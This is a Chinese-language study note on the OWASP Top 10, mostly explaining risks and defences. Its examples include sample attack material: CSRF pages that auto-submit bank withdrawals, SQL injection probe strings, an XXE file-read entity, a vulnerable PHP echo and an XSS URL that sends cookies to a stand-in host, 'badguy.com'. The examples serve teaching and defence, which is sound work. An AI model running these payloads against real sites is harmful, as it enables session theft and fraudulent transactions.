# OWASP TOP 10 2021

> https://owasp.org/www-project-top-ten/
>
> 中文版参考：https://blog.csdn.net/weixin_49422491/article/details/126078613

## A01 Broken Access Control（越权控制漏洞）包含 CSRF

> 常见的 CWE 包括：将敏感信息泄露给未经授权的参与者、通过发送的数据泄露敏感信息、跨站请求伪造（csrf）

未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问 **未经授权** 的功能或数据，进而 **越权**，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。

详情参考：https://zhuanlan.zhihu.com/p/130919069

**如何防范**

1、前后端同时对用户输入信息进行校验，双重验证机制

2、 执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限

3、特别敏感操作可以让用户再次输入密码或其他的验证信息。

4、可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息。

5、直接对象引用的加密资源 ID，防止攻击者枚举 ID，敏感数据特殊化处理

6、永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤

### 重点一：CSRF（跨站请求伪造）

CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证（例如 Cookie），绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。

一个典型的 CSRF 攻击流程：

- 用户登录 a.com，并保留了登录凭证(cookie)
- 攻击者引诱用户访问 b.com，如，诱导性文字按钮等
- b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带 a.com 的 cookie
- a.com 接收到请求后，对请求进行验证，并确认是受害用户的凭证，误以为是用户自己发送的请求
- a.com 以用户名义执行了 act=xx
- 攻击完成，攻击者在用户不知情的情况下，冒充用户，让 a.com 执行了自己定义的操作

CSRF 主要分为三类：

- GET 类型：img 标签 script。

  ```html
  <!DOCTYPE html>
  <html>
    <body>
      <h1>黑客的站点</h1>
      <img src="https://www.bank.com/withdraw?amount=1000?for=hacker" />
    </body>
  </html>
  ```

  黑客将转账的请求接口隐藏在 img 标签内，欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用户账户上的 100 就被转移到黑客的账户上去了。

- POST 类型：例如表单中的 POST 请求

  ```html
  <form action="http://bank.com/withdraw" method="POST">
    <input type="hidden" name="account" value="xiaoming" />
    <input type="hidden" name="amount" value="10000" />
    <input type="hidden" name="for" value="hacker" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
  ```

  访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。

- 引诱用户点击：例如 a 标签

  ```html
  <a href="http://bank.com/withdraw?amount=1000&for=hacker" taget="_blank"
    >重磅消息！！<a
  /></a>
  ```

  只要用户点击了，就会被攻击成功

**CSRF vs XSS**

与 XSS 不同的是，CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击

- 目标站点一定要有 CSRF 漏洞；

  后台接口一定是有问题的，[www.bank.com/withdraw?pa…](https://link.juejin.cn/?target=https%3A%2F%2Fwww.bank.com%2Fwithdraw%3Fpay%3D100bitcon%3FuserId%3D1),这样的话攻击者才有机会。

- 用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；

- 需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。

攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据，整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。 跨站请求可以用各种方式：图片 URL、超链接、CORS、Form 提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。 CSRF 通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。

**防御策略**

CSRF 通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对 CSRF 的防护能力来提升安全性。

**① 同源检测**

既然 CSRF 大多来自第三方网站，那么我们就直接禁止外域（或者不受信任的域名）对我们发起请求。

请求头有 **Origin Header**、**Referer Header**，这两个 Header 在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。 服务器可以通过解析这两个 Header 中的域名，确定请求的来源域。

Origin 字段内包含请求的域名，如果 Origin 存在，那么直接使用 Origin 中的字段确认来源域名就可以，但有时候 Origin 不存在，根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，记录了该 HTTP 请求的来源地址，因此，服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值，从而增加攻击难度。

**②Samesite Cookie**

为了从源头上解决这个问题，Google 起草了一份草案来改进 HTTP 协议，那就是为 Set-Cookie 响应头新增 Samesite 属性，它用来标明这个 Cookie 是个“同站 Cookie”，同站 Cookie 只能作为第一方 Cookie，不能作为第三方 Cookie，Samesite 有三个属性值，分别是 Strict 和 Lax，None。

**Samesite=Strict** 时表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。

**Samesite=Lax** 这种称为宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个 GET 请求，则这个 Cookie 可以作为第三方 Cookie。

比如说 b.com 设置了如下 Cookie：

```
Set-Cookie: foo=1; Samesite=Strict
Set-Cookie: bar=2; Samesite=Lax
Set-Cookie: baz=3
```

当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。

但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则 bar 也不会发送。

**③ 提交时要求附加本域才能获取的信息（token/双重 cookie）**

##### Token：存在本地 local strage 中的加密数据

token 是一个比较有效的 CSRF 防护方法，只要页面没有 XSS 漏洞泄露 Token，那么接口的 CSRF 攻击就无法成功，也是现在主流的解决方案。

**双重 cookie**：利用 csrf 不能获取本地 cookie 的特点。

参考：

- [前端安全系列（二）：如何防止 CSRF 攻击？](https://tech.meituan.com/2018/10/11/fe-security-csrf.html)
- [csrf 详解](https://juejin.cn/post/7008171429845811207)

## A02 Cryptographic Failures（加密故障）

以前称为 Sensitive Data Exposure（敏感数据泄露），这是广泛的症状，而不是根本原因。

因此此处重新关注的是与加密相关的故障，这通常会导致敏感数据泄露或系统泄露。

**风险说明**

首先要确认：对传输中的数据和存储数据都有哪些保护需求。例如：密码、信用卡号、医疗记录、个人信息和商业秘密需要额外保护。 对于数据，要确认：

- 在传输数据过程中是否使用明文传输？这和传输协议有关：HTTP、SMTP、经过 TLS 升级的 FTP。外部网络流量是有害的，需要验证所有的内部通信
- 无论是在默认情况还是在旧的代码中，是否还在使用任何旧或者脆弱的加密算法或传输协议
- 是否默认使用加密密钥、生成或重复使用脆弱的加密密钥，或者是否缺少适当的密钥管理或密钥回转
- 接收到的服务器证书和信任链是否经过正确验证

**如何防范**

- 对应用程序处理、存储或者传输的数据分类，并根据相关要求确认哪些数据敏感

- 对于没有必要存储的敏感数据，应当尽快清除

- 确保加密存储所有的敏感数据

- 确保使用了最新的，强大的标准算法、协议和密钥，并且密钥管理到位

- 禁用缓存对包含敏感数据的响应

- 不要使用传统协议 HTTP、FTP 等来传输敏感数据

## 重点二：A03 Injection（注入）

> 常见的 CWE：跨站点脚本（xss）、SQL 注入、文件名或路径的外部控制
>
> 从 2017 年的第一降低至第三

**如何防范**

- 使用肯定或者白名单服务器端对输入进行验证

- 对于任何残余的动态查询，使用该解释器的 **特定转义语法转义特殊字符**
- 在查询中使用 **LIMIT** 和其他 SQL 控件，以防止在 SQL 注入的情况下大量披露记录
- 应用 Web 应用防火墙（WAF）

**判断是否存在 Sql 注入漏洞**

最为经典的 **单引号判断法**，在参数后面加上单引号,比如:

```cpp
http://xxx/abc.php?id=1'
```

如果页面返回错误，则存在 Sql 注入。其原因是无论字符型还是整型都会因为单引号个数不匹配而报错。

如果未报错，不代表不存在 Sql 注入，因为有可能页面对单引号做了过滤，这时可以使用判断语句进行注入。

**① 是否存在数字型注入**

当输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下：
`select * from <表名> where id = x`
这种类型可以使用经典的 `and 1=1` 和 `and 1=2` 来判断：

- Url 地址中输入 `http://xxx/abc.php?id= x and 1=1` 页面依旧运行正常，继续进行下一步。
- Url 地址中继续输入 `http://xxx/abc.php?id= x and 1=2` 页面运行错误，则说明此 Sql 注入为数字型注入。

原因如下：
当输入 `and 1=1`时，后台执行 Sql 语句：

```csharp
select * from <表名> where id = x and 1=1
```

没有语法错误且逻辑判断为正确，所以返回正常。

当输入 `and 1=2`时，后台执行 Sql 语句：

```csharp
select * from <表名> where id = x and 1=2
```

没有语法错误但是逻辑判断为假，所以返回错误。

我们再使用假设法：如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：

```csharp
select * from <表名> where id = 'x and 1=1'
select * from <表名> where id = 'x and 1=2'
```

查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。

**② 是否存在字符型注入**

当输入的参 x 为字符型时，通常 abc.php 中 SQL 语句类型大致如下：
`select * from <表名> where id = 'x'`
这种类型我们同样可以使用 `and '1'='1` 和 `and '1'='2`来判断：

- Url 地址中输入 `http://xxx/abc.php?id= x' and '1'='1` 页面运行正常，继续进行下一步。
- Url 地址中继续输入 `http://xxx/abc.php?id= x' and '1'='2` 页面运行错误，则说明此 Sql 注入为字符型注入。

原因如下：
当输入 `and '1'='1`时，后台执行 Sql 语句：

```csharp
select * from <表名> where id = 'x' and '1'='1'
```

语法正确，逻辑判断正确，所以返回正确。

当输入 `and '1'='2`时，后台执行 Sql 语句：

```csharp
select * from <表名> where id = 'x' and '1'='2'
```

语法正确，但逻辑判断错误，所以返回正确。同学们同样可以使用假设法来验证。

**mysql 不知道列名怎么爆字段？**

查询 information_schema 表

追问，**这个表无权访问怎么办？**

利用 union 查询，进行查询时语句的字段数必须和指定表中的字段数一样，不能多也不能少，不然就会报错，例如：`Select 1,2,3 union select * from xxx;` （xxx 表有三列），结果为三列。

参考：

- [sql 注入基础原理](https://www.jianshu.com/p/078df7a35671)

## A04 Insecure Design（不安全的设计）

> 2021 版新增的

侧重于设计和体系结构缺陷相关的风险，呼吁更多的使用威胁建模、安全设计模式和参考体系结构

## A05 Security Misconfiguration（安全配置错误）

> 第 5 上升至 第 6。
>
> 90%的应用程序都经过了某种形式的错误配置测试，随着转向高度可配置软件的趋势不可逆，看到这一类别排名上升也就不足为奇了。此前版本的 XML 外部实体注入（XXE）类别现在也被合并为该类别的一部分。

**风险说明**

- 应用程序栈的任何部分缺少适当的安全加固，或者云服务的权限配置错误

- 应用程序启用或安装了不必要的功能（例如：不必要的端口、服务、网页、账户或权限）

- 默认账户和密码仍然可用且没有更改

- 错误处理机制向用户纰漏堆栈信息或其他大量错误信息

- 对于升级的系统，最新的安全特性被禁用或未安全配置

- 应用程序服务器、应用程序框架（如：Struts、Spring、ASP。net）、库文件、数据库等没有进行安全配置

**如何防范**

- 应实施安全的安装过程，包括 一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。

- 开发、质量保证和生产环境都应该进行相同配置，并且在每个环境中使用不同的密码。

- 这个过程应该是自动化的，以尽量减少安装一个新安全环境的消耗

- 搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和实例。

- 移除或不安装不适用的功能和框架

- 检查和修复安全配置来适应最新的安全说明、更新和补丁，并将作为更新管理过程的一部分

- 一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构

## A06 Vulnerable and Outdated Component（自带缺陷和过时的组件）

> 此前名为“使用具有已知漏洞的组件”（Using Components with Known Vulnerabilities）

**如何防范**

- 移除不使用的依赖、不需要的功能、组件、文件和文档
- 仅从官方渠道安全的获取组件，并使用前面机制来降低组件被篡改或加入恶意漏洞的风险 监控那些不再维护或者不发布安全补丁的库和组件。如果不能打补丁，就考虑部署虚拟补丁来监控、检查或保护

## A07 Identification and Authentication Failure （身份识别和身份验证错误）

> 此前称为“身份验证失效”（Broken Authentication）——排名从此前的第 2 位降到了第 7 位，而且该类别目前包含更多与识别失败相关的 CWE。虽然该类别仍然位列 Top 10 榜单，但标准化框架的可用性增加似乎有助于解决这一问题。

**攻击场景案例**

- 情境 1: **使用已知列表密码的撞库攻击** 是一种常见的攻击方式，假设应用程式没有实施自动化威胁或撞库攻击的保护，在这种情况下，应用程式会被利用为密码预报的工具来判断认证资讯是否有效。
- 情境 2:大多数的认证攻击是因为持续的使用密码作为唯一因素，最佳实践、密码轮换、以及复杂度的要求会鼓励用户使用和重复使用脆弱的密码。建议组织按照 NIST 800-63 停止这些做法并使用多因素认证。
- 情境 3: **应用程式的会话超时没有被设定正确（超时后不能仍然处于通过认证状态）**。一个用户使用公用电脑来存取应用程式时，用户没有选择"登出"而是简单的关闭浏览器分页就离开，此时一个攻击者在一小时后使用同一个浏览器，前一个用户仍然处于通过认证的状态。

**如何防范**

- 实施弱密码的检查，如测试新设定或变更的密码是否存在于前 10000 个最差密码清单
- 在可能的情况下，实施多因素认证来防止自动化撞库攻击，暴力破解，以及遭窃认证咨询被重复利用的攻击
- 不要交付或部署任何预设的认证凭证，特别是管理者
- 限制或增加登入失败尝试的延迟

## A08 Software and Data Integrity Failure（软件和数据完整性故障）

> 2021 年新增的一个类别，主要关注缺乏完整性验证情况下做出与软件更新、关键数据和持续集成/持续交付（CI/CD）流水线相关的各种假设。CVE/CVSS 数据最高加权影响之一映射到该类别中的 10 个 CWE。此前版本中的“不安全反序列化”（Insecure Deserialization）类别如今也被归入这一更大类别。

物件或资料经编码或 **序列化到一个对攻击者可读写的结构中** 将 **导致不安全的反序列化**。另一种形式则是应用程式依赖来自于不受信任来源，典藏库及内容递送网路之外挂，函式库或模组。

不安全的持续性整合/部署(CI/CD)流程则会造成潜在的未经授权存取，恶意程式码或系统破坏。

最后，现在许多应用程式拥有自动更新功能，但自动更新功能在缺乏充足完整性验证功能时就下载并安装更新到处于安全状态下的应用程式。攻击者能上传自制更新档案，更新档案将传播到所有已安装之应用程式并在这些应用程式上执行。 确保不受信任之客户端不会收到未签署或加密之序列化资料并利用完整性检查或数位签章来侦测窜改或重放攻击。

**如何防范**

- 使用数字签名或类似机制来验证软件或数据来自预期来源，且未被修改。
- 确保库和依赖项目，如: npm 或 Maven，正在使用受信任的存储库。如果您的风险较高，请考虑托管一个经过审核的、内部已知合格的存储库。
- 确保使用软件供应链安全工具(如:OWASP Dependency Check 或 OWASP CycloneDX)来验证组件不包含已知漏洞。
- 确保对代码和配置更改进行审核，以最大限度地减少恶意代码或配置引入软件管道的可能性。
- 确保您的 CI/CD 管道具有适当的隔离、配置和访问控制，以确保代码在构建和部署过程中的完整性。确保通过特定形式的完整性检查或数字签名来检测序列化数据是否存在篡改或重播，所有未签名或未加密的序列化数据不会发送到不受信任的客户端。

## A09 Security Logging and Monitoring Failure（安全日志与监控故障）

> 此前名为“日志记录和监控不足”（Insufficient Logging & Monitoring）

确保日志数据被正确编码加密，以防止对日志或监控系统的注入或攻击。

TODO Log4j2

## 重点三：A10 Server-Side Request Forgery（服务器端请求伪造，SSRF）

> 2021 年新增的类别

一旦 web 应用程序在获取远程资源时没有验证用户提供的 URL，就会出现 ssrf 缺陷。它允许攻击者强制应用程序发送一个精心构造的请求到意外的目的地，即使是在有防火墙，VPN 获其他类型的网络访问控制列表保护的情况下

<img src="https://img-blog.csdnimg.cn/d1e39cbc9b6f49eaad8d86753b169f23.png" alt="SSRF示例图" style="zoom:50%;" />

如何防范

1、过滤返回的信息，如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

2、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。

3、限制请求的端口，比如 80,443,8080,8090。

4、禁止不常用的协议，仅仅允许 http 和 https 请求。可以防止类似于 file:_///,gopher://,ftp://等引起的问题。_

5、使用 DNS 缓存或者 Host 白名单的方式。

# OWASP TOP 10 2017

## A04 XML External Entities，XXE（XML 外部实体）

XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 DoS 攻击等危害。

防止 XXE 的最安全方法始终是完全禁用 DTD（外部实体）。

```xml
 <?xml version="1.0" encoding="UTF-8"?>   //xml的声明
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file://d:/1.txt" >
 ]>                                      //DTD部分
<x>&xxe;</x>                          //xml部分
```

DTD 的部分，意思是读取 d 盘上的 1.txt 文件，当然如果是读取用户密码呢？或者也可以进行更多其他的危险操作。

## A07 重点四：Cross-Site Scripting，XSS（跨站脚本攻击）

> 跨站脚本攻击（Cross Site Scripting），为不和层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS。

由于 WEB 应用程序 **对用户的输入过滤不足** 而产生的。攻击者 **利用网站漏洞把恶意的脚本代码注入到网页中**，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。

XSS 主要分为三类：

- 反射型 XSS（后端）
- DOM XSS（前端）
- 持久型 XSS

**反射型 XSS**

通常来说，服务端的代码存在 XSS 漏洞，例如：

```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
?>
```

该代码直接从 url 参数中获取 `name` 字段，但如果 `name` 字段是精心构造的攻击代码呢？就很容易攻击者利用。

因此，攻击者可以精心构造攻击 URL，但仍然需要用户点击该 URL 才行，因此通常来说攻击者通过电子邮件等方式给别人发送带有恶意脚本代码参数的 URL，服务器端解析后响应，XSS 代码随响应内容一起传回给浏览器，最后浏览器解析执行 XSS 代码。

**DOM XSS**

DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据。

Tom 发现了 Victim.com 中的一个页面有 XSS 漏洞，

例如: http://victim.com/search.asp?term=apple

```html
<html>
  　　<title
  ></title>
  　　
  <body>
    　　　　Results for <%Reequest.QueryString("term")%> 　　　　... 　　
  </body>
</html>
```

Tom 先建立一个网站http://badguy.com, 用来接收“偷”来的信息。
然后 Tom 构造一个恶意的 url(如下), 通过某种方式(邮件，QQ)发给 Monica

```
http://victim.com/search.asp?term=<script>window.open("http://badguy.com?cookie="+document.cookie)</script>
```

Monica 点击了这个 URL， 嵌入在 URL 中的恶意 Javascript 代码就会在 Monica 的浏览器中执行。 那么 Monica 在 victim.com 网站的 cookie, 就会被发送到 badguy 网站中。这样 Monica 在 victim.com 的信息就被 Tom 盗了。

**持久型 XSS**

又称存储型，该类型是应用广泛而且有可能影响大 Web 服务器自身安全的漏洞，攻击者将攻击脚本上传到 Web 服务器上，使得所有访问该页面的用户都面临信息泄露的可能。 攻击过程如下

Alex 发现了网站 A 上有一个 XSS 漏洞，该漏洞允许将攻击代码保存在数据库中，

Alex 发布了一篇文章，文章中嵌入了恶意 JavaScript 代码。

其他人如 Monica 访问这片文章的时候，嵌入在文章中的恶意 Javascript 代码就会在 Monica 的浏览器中执行，其会话 cookie 或者其他信息将被 Alex 盗走。

Dom-Based XSS 漏洞威胁用户个体，而存储式 XSS 漏洞所威胁的对象将是大量的用户。

**XSS 的防御**： 对输入进行过滤，对输出进行编码

- httpOnly：在 cookie 中设置 HttpOnly 属性后，js 脚本将无法读取到 cookie 信息（例如 document.cookie）。

  ![httponly](https://happytsing-figure-bed.oss-cn-hangzhou.aliyuncs.com/secret/httponly.png)

- 对数据进行 Html Encode 处理，即转义 HTML，对 url 中的引号，尖括号，斜杠进行转义。例如：htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。

  > HTML Encode 和 URL Encode
  >
  > - HTML Encode：XSS 之所以会发生， 是因为用户输入的数据变成了代码。 所以我们需要对用户输入的数据进行 HTML Encode 处理。 将其中的"中括号"， “单引号”，“引号” 之类的特殊字符进行编码。
  >
  >   ```html
  >   #预定义的字符是：
  >   & (和号)   成为 &amp
  >   " (双引号) 成为 &quot
  >   ’ (单引号) 成为 &#039
  >   < (小于)   成为 &lt
  >   > (大于)   成为 &gt
  >   ```
  >
  > - URL Encode：URL 编码是为了符合 url 的规范。因为在标准的 url 规范中中文和很多的字符是不允许出现在 url 中的。
  >
  >   例如在 baidu 中搜索"测试汉字"。 URL 会变成
  >   http://www.baidu.com/s?wd=%B2%E2%CA%D4%BA%BA%D7%D6&rsv_bp=0&rsv_spt=3&inputT=7477

- 黑名单

  - 过滤 或移除特殊的 Html 标签， 例如: \<script>, \<iframe> , &lt; for <, &gt; for >, &quot for
  - 过滤 JavaScript 事件的标签。例如 "onclick=", "onfocus" 等等。

- 白名单：只允许用户输入我们期望的数据。 例如：年龄的 textbox 中，只允许用户输入数字。 而数字之外的字符都过滤掉。

- 浏览器自带 XSS 过滤器：为了防止发生 XSS， 很多浏览器厂商都在浏览器中加入安全机制来过滤 XSS。 例如 IE8，IE9，Firefox, Chrome. 都有针对 XSS 的安全机制。 浏览器会阻止 XSS。

**XSS 的利用方式**

- cookie 窃取
- 会话劫持
- 钓鱼
- 网页挂马：一般都是通过篡改网页的方式来实现的，如在 XSS 中使用 `<iframe>` 标签。
- DOS
- XSS 蠕虫

参考：

- [XSS 原理和攻防 | bilibili](https://www.bilibili.com/video/BV1DW411U7XE/)
- [Web 安全测试之 XSS](https://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html)

# 名词

## IDS

IDS 是英文 Intrusion Detection Systems 的缩写，中文意思是「入侵检测系统」。专业上讲就是依照一定的安全策略，通过软、硬件，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。做一个形象的比喻：假如防火墙是一幢大楼的门锁，那么 IDS 就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。

## IPS

入侵防御系统（IPS：Intrusion Prevention System）是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙（Packet Filter，Application Gateway）的补充。入侵预防系统（Intrusion-prevention system）是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。

## WAF

Web 应用防护系统（也称：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：WEB 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 WEB 应用提供保护的一款产品。

## IAST/SAST/DAST/HAST

AST（Application Security Test，应用安全测试）工具是应用程序软件安全实践的支柱之一。

<img src="https://happytsing-figure-bed.oss-cn-hangzhou.aliyuncs.com/pwn/ast.png" alt="AST" style="zoom:50%;" />

- SAST（Static Application Security Testing，静态应用程序安全测试）对应用程序源代码执行直接的白盒分析。分析是在代码的静态视图上运行的，这意味着代码在审查时没有运行。其优点为检出率高，可定位到代码行。但误报率高，无法看到执行流，运行慢。
- DAST（Dynamic Application Security Testing，动态应用程序安全测试）与 SAST 相反，对应用程序进行黑盒分析，这意味着它们不能访问代码或实现细节。DAST 只检查系统对潜在漏洞测试的请求和响应。优点为执行快、无需源码、误报率低，缺点是检出率低，无法定位到代码行。
- IAST（Interactive Application Security Testing，交互式应用程序安全测试）结合了 SAST 和 DAST 的优点。IAST 可以像 SAST 一样看到源代码，也可以像 DAST 一样看到应用程序运行时的执行流。

注意，IAST 工具将应用程序代码（称为“代理”）安装到应用程序中，以便在应用程序运行时监视应用程序，扫描安全漏洞。

也就是说，IAST 会对应用程序性能产生负面影响：因为它们会为代码添加工具，所以它们会改变代码的执行方式。

于是，为了在开发过程中获得运行时知识的安全性好处，但不会影响用户，我们设计了一种混合方法，在动态测试期间使用代理技术获取运行时代码执行洞察，并结合这些见解通过静态测试，可以更快，更轻松地找到并修复攻击者最容易访问的漏洞，HAST（混合应用安全测试） 出现了！
